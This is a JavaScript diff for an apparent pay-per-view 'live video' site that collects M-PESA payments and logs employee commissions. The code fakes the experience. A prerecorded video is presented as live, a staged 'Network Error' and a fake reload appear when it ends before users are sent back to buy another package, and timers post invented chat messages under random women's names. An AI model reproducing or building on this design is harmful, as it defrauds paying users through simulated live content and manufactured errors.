+            showNetworkError();
+          });
+        }
+      };
+    });
+  }
 }
 
-transactionId =
-String(
-data.transaction_id ||
-data.transaction_request_id ||
-data.paymentId
-);
+/* VIDEO ENDED */
 
-statusAttempts = 0;
+liveVideo.addEventListener("ended", function() {
 
-statusTitle.textContent =
-"Check your phone";
+  liveVideo.pause();
 
-statusText.textContent =
-"M-PESA prompt sent. Enter your M-PESA PIN on your phone to complete the payment.";
+  if (videoEndedTimer) {
+    clearTimeout(videoEndedTimer);
+  }
 
-startPaymentStatusCheck();
-
-}catch(error){
-
-console.error(
-"STK ERROR:",
-error
-);
-
-showFailed(
-"Unable to start the M-PESA payment. Please try again."
-);
-
-}
-
-}
-
-
-/* ================================
-   PAYMENT STATUS TIMER
-================================ */
-
-function startPaymentStatusCheck(){
-
-stopStatusCheck();
-
-statusAttempts = 0;
-
-checkPaymentStatus();
-
-statusTimer =
-setInterval(
-checkPaymentStatus,
-3000
-);
-
-}
-
-function stopStatusCheck(){
-
-if(statusTimer){
-
-clearInterval(statusTimer);
-
-statusTimer = null;
-
-}
-
-}
-
-
-/* ================================
-   CHECK PAYMENT STATUS
-================================ */
-
-async function checkPaymentStatus(){
-
-if(!transactionId){
-return;
-}
-
-statusAttempts++;
-
-if(statusAttempts > 40){
-
-stopStatusCheck();
-
-showFailed(
-"The payment confirmation timed out. Please check your M-PESA message and try again."
-);
-
-return;
-
-}
-
-try{
-
-const response =
-await fetch("/api/payment-status",{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-/*
-IMPORTANT:
-
-SEND:
-transaction
-reference
-employee
-ref
-
-SO COMMISSION CAN BE CONNECTED
-TO THE CORRECT EMPLOYEE.
-*/
-
-body:JSON.stringify({
-
-transaction_id:
-transactionId,
-
-transaction_request_id:
-transactionId,
-
-reference:
-paymentReference,
-
-employee:
-employee,
-
-ref:
-ref
-
-})
-
-});
-
-const data =
-await response.json().catch(function(){
-
-return {};
-
-});
-
-
-/*
-ONLY OPEN VIDEO
-AFTER VERIFIED PAYMENT
-*/
-
-if(
-data.success === true &&
-data.paid === true
-){
-
-stopStatusCheck();
-
-paymentConfirmed();
-
-return;
-
-}
-
-
-const currentStatus =
-String(
-data.status || ""
-).toLowerCase();
-
-
-if(
-currentStatus === "failed" ||
-currentStatus === "cancelled" ||
-currentStatus === "rejected"
-){
-
-stopStatusCheck();
-
-showFailed(
-data.message ||
-"The M-PESA payment was not completed."
-);
-
-return;
-
-}
-
-
-statusTitle.textContent =
-"Waiting for payment";
-
-statusText.textContent =
-"Please complete the M-PESA prompt on your phone. We are checking the payment automatically.";
-
-}catch(error){
-
-console.log(
-"STATUS CHECK ERROR:",
-error
-);
-
-statusText.textContent =
-"Still checking your M-PESA payment...";
-
-}
-
-}
-
-
-/* ================================
-   PAYMENT CONFIRMED
-================================ */
-
-async function paymentConfirmed(){
-
-statusCard.classList.remove("hidden");
-
-statusSpinner.classList.add("hidden");
-
-statusIcon.classList.remove("hidden");
-
-statusIcon.textContent = "✓";
-
-statusTitle.textContent =
-"Payment confirmed";
-
-statusText.textContent =
-"Payment successful. Opening your live video...";
-
-promptButton.disabled = true;
-
-
-/*
-================================
-40% EMPLOYEE COMMISSION
-================================
-*/
-
-if(employee || ref){
-
-try{
-
-const commissionResponse =
-await fetch("/api/employee-commission",{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-
-transaction_id:
-transactionId,
-
-employeeId:
-employee || ref,
-
-referral:
-employee || ref
-
-})
-
-});
-
-const commissionData =
-await commissionResponse.json().catch(function(){
-
-return {};
-
-});
-
-console.log(
-"EMPLOYEE COMMISSION RESULT:",
-commissionData
-);
-
-if(!commissionResponse.ok){
-
-console.error(
-"Commission recording failed:",
-commissionData
-);
-
-}
-
-}catch(error){
-
-console.error(
-"COMMISSION ERROR:",
-error
-);
-
-}
-
-}
-
-
-/*
-OPEN LIVE ONLY AFTER PAYMENT CONFIRMATION
-*/
-
-setTimeout(function(){
-
-openLiveAfterPayment();
-
-},1200);
-
-}
-  /* ================================
-   FAILED PAYMENT
-================================ */
-
-function showFailed(message){
-
-stopStatusCheck();
-
-statusCard.classList.add("hidden");
-
-failedCard.classList.remove("hidden");
-
-failedText.textContent =
-message ||
-"We could not confirm your M-PESA payment.";
-
-promptButton.disabled = false;
-
-promptButton.textContent =
-"💳 SEND M-PESA PROMPT";
-
-}
-
-
-/* ================================
-   TRY AGAIN
-================================ */
-
-function resetPayment(){
-
-stopStatusCheck();
-
-transactionId = "";
-
-paymentReference = "";
-
-statusAttempts = 0;
-
-statusCard.classList.add("hidden");
-
-failedCard.classList.add("hidden");
-
-promptButton.disabled = false;
-
-promptButton.textContent =
-"💳 SEND M-PESA PROMPT";
-
-phoneInput.value = "";
-
-phoneInput.focus();
-
-}
-
-
-/* ================================
-   OPEN LIVE
-================================ */
-
-function openLiveAfterPayment(){
-
-paymentPage.classList.add("hidden");
-
-failedCard.classList.add("hidden");
-
-statusCard.classList.add("hidden");
-
-liveScreen.classList.remove("hidden");
-
-liveStarted = true;
-
-showVideoOverlay(
-"Camera permission required",
-"Allow camera and microphone access to continue."
-);
-
-}
-
-
-/* ================================
-   CAMERA PERMISSION
-================================ */
-
-async function requestCameraPermission(){
-
-permissionButton.disabled = true;
-
-permissionButton.textContent =
-"ALLOWING...";
-
-if(
-!navigator.mediaDevices ||
-!navigator.mediaDevices.getUserMedia
-){
-
-permissionButton.disabled = false;
-
-permissionButton.textContent =
-"CONTINUE";
-
-hideVideoOverlay();
-
-startLiveVideo();
-
-startLiveChat();
-
-return;
-
-}
-
-try{
-
-permissionStream =
-await navigator.mediaDevices.getUserMedia({
-
-video:true,
-audio:true
+  videoEndedTimer = setTimeout(function() {
+    showNetworkError();
+  }, 5000);
 
 });
 
-permissionStream
-.getTracks()
-.forEach(function(track){
+/* VIDEO ERROR */
 
-track.stop();
+liveVideo.addEventListener("error", function() {
 
-});
-
-permissionStream = null;
-
-hideVideoOverlay();
-
-startLiveVideo();
-
-startLiveChat();
-
-}catch(error){
-
-console.log(
-"Camera permission error:",
-error
-);
-
-permissionButton.disabled = false;
-
-permissionButton.textContent =
-"CONTINUE";
-
-permissionText.textContent =
-"Camera access was not granted. Tap CONTINUE to watch the live video.";
-
-permissionButton.onclick =
-function(){
-
-hideVideoOverlay();
-
-startLiveVideo();
-
-startLiveChat();
-
-};
-
-}
-
-}
-
-
-/* ================================
-   VIDEO OVERLAY
-================================ */
-
-function showVideoOverlay(title,text){
-
-videoOverlay.classList.remove("hidden");
-
-permissionTitle.textContent =
-title;
-
-permissionText.textContent =
-text;
-
-permissionButton.disabled = false;
-
-permissionButton.textContent =
-"CONTINUE";
-
-permissionButton.onclick =
-requestCameraPermission;
-
-}
-
-function hideVideoOverlay(){
-
-videoOverlay.classList.add("hidden");
-
-}
-
-
-/* ================================
-   START VIDEO
-================================ */
-
-function startLiveVideo(){
-
-videoError.classList.add("hidden");
-
-if(videoEndedTimer){
-
-clearTimeout(videoEndedTimer);
-
-videoEndedTimer = null;
-
-}
-
-liveVideo.src =
-LIVE_VIDEO_URL;
-
-liveVideo.controls = false;
-
-liveVideo.muted = false;
-
-liveVideo.playsInline = true;
-
-liveVideo.load();
-
-const playPromise =
-liveVideo.play();
-
-if(
-playPromise &&
-typeof playPromise.catch === "function"
-){
-
-playPromise.catch(function(){
-
-showVideoOverlay(
-"Tap to continue",
-"Tap CONTINUE to start the live video."
-);
-
-permissionButton.onclick =
-function(){
-
-hideVideoOverlay();
-
-const attempt =
-liveVideo.play();
-
-if(
-attempt &&
-attempt.catch
-){
-
-attempt.catch(function(){
-
-showNetworkError();
+  if (liveStarted) {
+    showNetworkError();
+  }
 
 });
 
+/* NETWORK ERROR */
+
+function showNetworkError() {
+
+  videoError.classList.remove("hidden");
+
+  videoError.innerHTML = `
+
+    <div style="width:100%;text-align:center;">
+
+      <div style="
+        font-size:17px;
+        font-weight:900;
+        margin-bottom:6px;
+      ">
+        ⚠️ Network Error
+      </div>
+
+      <div style="
+        color:#999;
+        font-size:12px;
+        margin-bottom:12px;
+      ">
+        The live video connection was interrupted.
+      </div>
+
+      <button onclick="reloadLivePage()">
+        RELOAD PAGE
+      </button>
+
+    </div>
+
+  `;
 }
 
-};
+/* RELOAD VIDEO */
 
-});
+function reloadLivePage() {
 
+  videoError.innerHTML = `
+
+    <div style="width:100%;text-align:center;">
+
+      <div style="
+        width:32px;
+        height:32px;
+        margin:0 auto 12px;
+        border:3px solid #333;
+        border-top-color:#fff;
+        border-radius:50%;
+        animation:spin .8s linear infinite;
+      "></div>
+
+      <div style="font-size:17px;font-weight:900;">
+        Reloading...
+      </div>
+
+      <div style="color:#999;font-size:12px;margin-top:6px;">
+        Please wait...
+      </div>
+
+    </div>
+
+  `;
+
+  setTimeout(function() {
+
+    videoError.innerHTML = `
+
+      <div style="width:100%;text-align:center;">
+
+        <div style="font-size:20px;font-weight:900;">
+          ❌ Error
+        </div>
+
+        <div style="color:#999;font-size:12px;margin-top:7px;">
+          Unable to reload the live video.
+        </div>
+
+      </div>
+
+    `;
+
+    setTimeout(function() {
+      returnToPackages();
+    }, 1200);
+
+  }, 10000);
 }
 
+/* RETURN TO PACKAGES */
+
+function returnToPackages() {
+
+  if (videoEndedTimer) {
+    clearTimeout(videoEndedTimer);
+    videoEndedTimer = null;
+  }
+
+  try {
+
+    liveVideo.pause();
+    liveVideo.removeAttribute("src");
+    liveVideo.load();
+
+  } catch (error) {}
+
+  if (chatTimer) {
+    clearInterval(chatTimer);
+    chatTimer = null;
+  }
+
+  liveStarted = false;
+
+  liveScreen.classList.add("hidden");
+  paymentPage.classList.remove("hidden");
+
+  statusCard.classList.add("hidden");
+  failedCard.classList.add("hidden");
+  videoError.classList.add("hidden");
+
+  transactionId = "";
+  paymentReference = "";
+  statusAttempts = 0;
+
+  promptButton.disabled = false;
+
+  promptButton.textContent =
+    "💳 SEND M-PESA PROMPT";
+
+  selectedValue.textContent =
+    selectedPackageLabel + " — KSh " + selectedPrice;
+
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
 }
 
-
-/* ================================
-   VIDEO ENDED
-================================ */
-
-liveVideo.addEventListener(
-"ended",
-function(){
-
-liveVideo.pause();
-
-if(videoEndedTimer){
-
-clearTimeout(videoEndedTimer);
-
-}
-
-videoEndedTimer =
-setTimeout(function(){
-
-showNetworkError();
-
-},5000);
-
-}
-);
-
-
-/* ================================
-   VIDEO ERROR
-================================ */
-
-liveVideo.addEventListener(
-"error",
-function(){
-
-if(liveStarted){
-
-showNetworkError();
-
-}
-
-}
-);
-
-
-/* ================================
-   NETWORK ERROR
-================================ */
-
-function showNetworkError(){
-
-videoError.classList.remove("hidden");
-
-videoError.innerHTML = `
-
-<div style="
-width:100%;
-text-align:center;
-">
-
-<div style="
-font-size:17px;
-font-weight:900;
-margin-bottom:6px;
-">
-⚠️ Network Error
-</div>
-
-<div style="
-color:#999;
-font-size:12px;
-margin-bottom:12px;
-">
-The live video connection was interrupted.
-</div>
-
-<button onclick="reloadLivePage()">
-RELOAD PAGE
-</button>
-
-</div>
-
-`;
-
-}
-
-
-/* ================================
-   RELOAD VIDEO
-================================ */
-
-function reloadLivePage(){
-
-videoError.innerHTML = `
-
-<div style="
-width:100%;
-text-align:center;
-">
-
-<div style="
-width:32px;
-height:32px;
-margin:0 auto 12px;
-border:3px solid #333;
-border-top-color:#fff;
-border-radius:50%;
-animation:spin .8s linear infinite;
-"></div>
-
-<div style="
-font-size:17px;
-font-weight:900;
-">
-Reloading...
-</div>
-
-<div style="
-color:#999;
-font-size:12px;
-margin-top:6px;
-">
-Please wait...
-</div>
-
-</div>
-
-`;
-
-setTimeout(function(){
-
-videoError.innerHTML = `
-
-<div style="
-width:100%;
-text-align:center;
-">
-
-<div style="
-font-size:20px;
-font-weight:900;
-">
-❌ Error
-</div>
-
-<div style="
-color:#999;
-font-size:12px;
-margin-top:7px;
-">
-Unable to reload the live video.
-</div>
-
-</div>
-
-`;
-
-setTimeout(function(){
-
-returnToPackages();
-
-},1200);
-
-},10000);
-
-}
-
-
-/* ================================
-   RETURN TO PACKAGES
-================================ */
-
-function returnToPackages(){
-
-if(videoEndedTimer){
-
-clearTimeout(videoEndedTimer);
-
-videoEndedTimer = null;
-
-}
-
-try{
-
-liveVideo.pause();
-
-liveVideo.removeAttribute("src");
-
-liveVideo.load();
-
-}catch(error){}
-
-
-if(chatTimer){
-
-clearInterval(chatTimer);
-
-chatTimer = null;
-
-}
-
-liveStarted = false;
-
-liveScreen.classList.add("hidden");
-
-paymentPage.classList.remove("hidden");
-
-statusCard.classList.add("hidden");
-
-failedCard.classList.add("hidden");
-
-videoError.classList.add("hidden");
-
-transactionId = "";
-
-paymentReference = "";
-
-statusAttempts = 0;
-
-promptButton.disabled = false;
-
-promptButton.textContent =
-"💳 SEND M-PESA PROMPT";
-
-selectedValue.textContent =
-selectedMinutes +
-" Minutes — KSh " +
-selectedPrice;
-
-window.scrollTo({
-top:0,
-behavior:"smooth"
-});
-
-}
-
-
-/* ================================
-   CHAT DATA
-================================ */
+/* CHAT DATA */
 
 const chatNames = [
-"Sarah",
-"Linda",
-"Aisha",
-"Mercy",
-"Becky",
-"Dorry",
-"Jane",
-"Grace",
-"Ann",
-"Lucy",
-"Nelly",
-"Maya"
+  "Sarah",
+  "Linda",
+  "Aisha",
+  "Mercy",
+  "Becky",
+  "Dorry",
+  "Jane",
+  "Grace",
+  "Ann",
+  "Lucy",
+  "Nelly",
+  "Maya"
 ];
 
 const chatMessages = [
-"Hi ❤️",
-"Hello everyone",
-"So nice here 😍",
-"Hi there",
-"You look amazing",
-"Hello 👋",
-"Anyone online?",
-"This is live 🔥",
-"Hey ❤️",
-"Nice to meet you",
-"Wow 😍",
-"Hello beautiful"
+  "Hi ❤️",
+  "Hello everyone",
+  "So nice here 😍",
+  "Hi there",
+  "You look amazing",
+  "Hello 👋",
+  "Anyone online?",
+  "This is live 🔥",
+  "Hey ❤️",
+  "Nice to meet you",
+  "Wow 😍",
+  "Hello beautiful"
 ];
 
-function randomItem(array){
+function randomItem(array) {
 
-return array[
-Math.floor(
-Math.random() * array.length
-)
-];
+  return array[
+    Math.floor(Math.random() * array.length)
+  ];
 
 }
 
-function escapeHTML(text){
+function escapeHTML(text) {
 
-const div =
-document.createElement("div");
+  const div = document.createElement("div");
 
-div.textContent = text;
+  div.textContent = text;
 
-return div.innerHTML;
-
- }
-  /* ================================
-   CREATE CHAT MESSAGE
-================================ */
-
-function createChatMessage(){
-
-const name =
-randomItem(chatNames);
-
-const message =
-randomItem(chatMessages);
-
-const div =
-document.createElement("div");
-
-div.className =
-"chat-message";
-
-div.innerHTML =
-'<span class="chat-name">' +
-escapeHTML(name) +
-':</span> ' +
-'<span class="chat-text">' +
-escapeHTML(message) +
-'</span>';
-
-return div;
-
+  return div.innerHTML;
 }
 
+/* CREATE CHAT MESSAGE */
 
-/* ================================
-   ADD CHAT MESSAGE
-================================ */
+function createChatMessage() {
 
-function addChatMessage(){
+  const name = randomItem(chatNames);
+  const message = randomItem(chatMessages);
 
-const left =
-document.getElementById(
-"leftChatMessages"
-);
+  const div = document.createElement("div");
 
-const right =
-document.getElementById(
-"rightChatMessages"
-);
+  div.className = "chat-message";
 
-if(!left || !right){
-return;
+  div.innerHTML =
+    '<span class="chat-name">' +
+    escapeHTML(name) +
+    ':</span> ' +
+    '<span class="chat-text">' +
+    escapeHTML(message) +
+    '</span>';
+
+  return div;
 }
 
-left.appendChild(
-createChatMessage()
-);
+/* ADD CHAT MESSAGE */
 
-right.appendChild(
-createChatMessage()
-);
+function addChatMessage() {
 
-while(left.children.length > 12){
+  const left = document.getElementById("leftChatMessages");
+  const right = document.getElementById("rightChatMessages");
 
-left.removeChild(
-left.firstChild
-);
+  if (!left || !right) return;
 
+  left.appendChild(createChatMessage());
+  right.appendChild(createChatMessage());
+
+  while (left.children.length > 12) {
+    left.removeChild(left.firstChild);
+  }
+
+  while (right.children.length > 12) {
+    right.removeChild(right.firstChild);
+  }
 }
 
-while(right.children.length > 12){
+/* START CHAT */
 
-right.removeChild(
-right.firstChild
-);
+function startLiveChat() {
 
+  if (chatTimer) {
+    clearInterval(chatTimer);
+  }
+
+  addChatMessage();
+
+  chatTimer = setInterval(function() {
+
+    if (liveStarted) {
+      addChatMessage();
+    }
+
+  }, 2800);
 }
 
+/* CENTER CHAT */
+
+function sendCenterMessage() {
+
+  const input = document.getElementById("centerChatInput");
+
+  if (!input) return;
+
+  const message = input.value.trim();
+
+  if (!message) return;
+
+  const left = document.getElementById("leftChatMessages");
+
+  if (!left) return;
+
+  const div = document.createElement("div");
+
+  div.className = "chat-message";
+
+  div.innerHTML =
+    '<span class="chat-name">You:</span> ' +
+    '<span class="chat-text">' +
+    escapeHTML(message) +
+    '</span>';
+
+  left.appendChild(div);
+
+  while (left.children.length > 12) {
+    left.removeChild(left.firstChild);
+  }
+
+  left.scrollTop = left.scrollHeight;
+
+  input.value = "";
 }
 
+/* CENTER CHAT ENTER */
 
-/* ================================
-   START CHAT
-================================ */
+const centerInput = document.getElementById("centerChatInput");
 
-function startLiveChat(){
+if (centerInput) {
 
-if(chatTimer){
+  centerInput.addEventListener("keydown", function(event) {
 
-clearInterval(chatTimer);
+    if (event.key === "Enter") {
+      event.preventDefault();
+      sendCenterMessage();
+    }
 
+  });
 }
 
-addChatMessage();
+/* PHONE INPUT */
 
-chatTimer =
-setInterval(function(){
+phoneInput.addEventListener("input", function() {
 
-if(liveStarted){
+  let value = this.value.replace(/\D/g, "");
 
-addChatMessage();
+  if (value.length > 13) {
+    value = value.substring(0, 13);
+  }
 
-}
-
-},2800);
-
-}
-
-
-/* ================================
-   CENTER CHAT
-================================ */
-
-function sendCenterMessage(){
-
-const input =
-document.getElementById(
-"centerChatInput"
-);
-
-if(!input){
-return;
-}
-
-const message =
-input.value.trim();
-
-if(!message){
-return;
-}
-
-const left =
-document.getElementById(
-"leftChatMessages"
-);
-
-if(!left){
-return;
-}
-
-const div =
-document.createElement("div");
-
-div.className =
-"chat-message";
-
-div.innerHTML =
-'<span class="chat-name">You:</span> ' +
-'<span class="chat-text">' +
-escapeHTML(message) +
-'</span>';
-
-left.appendChild(div);
-
-while(left.children.length > 12){
-
-left.removeChild(
-left.firstChild
-);
-
-}
-
-left.scrollTop =
-left.scrollHeight;
-
-input.value = "";
-
-}
-
-
-/* ================================
-   CENTER CHAT ENTER
-================================ */
-
-const centerInput =
-document.getElementById(
-"centerChatInput"
-);
-
-if(centerInput){
-
-centerInput.addEventListener(
-"keydown",
-function(event){
-
-if(event.key === "Enter"){
-
-event.preventDefault();
-
-sendCenterMessage();
-
-}
+  this.value = value;
 
 });
 
-}
+/* PHONE ENTER KEY */
 
+phoneInput.addEventListener("keydown", function(event) {
 
-/* ================================
-   PHONE INPUT
-================================ */
-
-phoneInput.addEventListener(
-"input",
-function(){
-
-let value =
-this.value.replace(
-/\D/g,
-""
-);
-
-if(value.length > 13){
-
-value =
-value.substring(0,13);
-
-}
-
-this.value = value;
+  if (event.key === "Enter") {
+    event.preventDefault();
+    sendMpesaPrompt();
+  }
 
 });
 
+/* CLEANUP */
 
-/* ================================
-   PHONE ENTER KEY
-================================ */
+window.addEventListener("beforeunload", function() {
 
-phoneInput.addEventListener(
-"keydown",
-function(event){
+  stopStatusCheck();
 
-if(event.key === "Enter"){
+  if (chatTimer) {
+    clearInterval(chatTimer);
+    chatTimer = null;
+  }
 
-event.preventDefault();
+  if (videoEndedTimer) {
+    clearTimeout(videoEndedTimer);
+    videoEndedTimer = null;
+  }
 
-sendMpesaPrompt();
+  if (permissionStream) {
 
-}
+    permissionStream
+      .getTracks()
+      .forEach(function(track) {
+        track.stop();
+      });
 
-});
+    permissionStream = null;
+  }
 
+  if (liveVideo) {
 
-/* ================================
-   CLEANUP
-================================ */
+    try {
+      liveVideo.pause();
+    } catch (error) {}
 
-window.addEventListener(
-"beforeunload",
-function(){
-
-stopStatusCheck();
-
-if(chatTimer){
-
-clearInterval(chatTimer);
-
-chatTimer = null;
-
-}
-
-if(videoEndedTimer){
-
-clearTimeout(videoEndedTimer);
-
-videoEndedTimer = null;
-
-}
-
-if(permissionStream){
-
-permissionStream
-.getTracks()
-.forEach(function(track){
-
-track.stop();
+  }
 
 });
 
-permissionStream = null;
+/* VISIBILITY */
 
-}
+document.addEventListener("visibilitychange", function() {
 
-if(liveVideo){
+  if (document.hidden) {
 
-try{
+    if (liveVideo && !liveVideo.paused) {
+      liveVideo.pause();
+    }
 
-liveVideo.pause();
+  } else {
 
-}catch(error){}
+    if (
+      liveStarted &&
+      liveVideo &&
+      liveVideo.src &&
+      !liveVideo.ended &&
+      videoError.classList.contains("hidden")
+    ) {
 
-}
+      const promise = liveVideo.play();
 
-});
+      if (promise && promise.catch) {
+        promise.catch(function() {});
+      }
 
-
-/* ================================
-   VISIBILITY
-================================ */
-
-document.addEventListener(
-"visibilitychange",
-function(){
-
-if(document.hidden){
-
-if(
-liveVideo &&
-!liveVideo.paused
-){
-
-liveVideo.pause();
-
-}
-
-}else{
-
-if(
-liveStarted &&
-liveVideo &&
-liveVideo.src &&
-!liveVideo.ended &&
-videoError.classList.contains("hidden")
-){
-
-const promise =
-liveVideo.play();
-
-if(
-promise &&
-promise.catch
-){
-
-promise.catch(function(){});
-
-}
-
-}
-
-}
+    }
+  }
 
 });
 
+/* INITIAL PACKAGE */
 
-/* ================================
-   INITIAL PACKAGE
-================================ */
+document.addEventListener("DOMContentLoaded", function() {
 
-document.addEventListener(
-"DOMContentLoaded",
-function(){
+  const firstPackage = document.querySelector(".package");
 
-const firstPackage =
-document.querySelector(".package");
-
-if(firstPackage){
-
-selectPackage(firstPackage);
-
-}
+  if (firstPackage) {
+    selectPackage(firstPackage);
+  }
 
 });
 
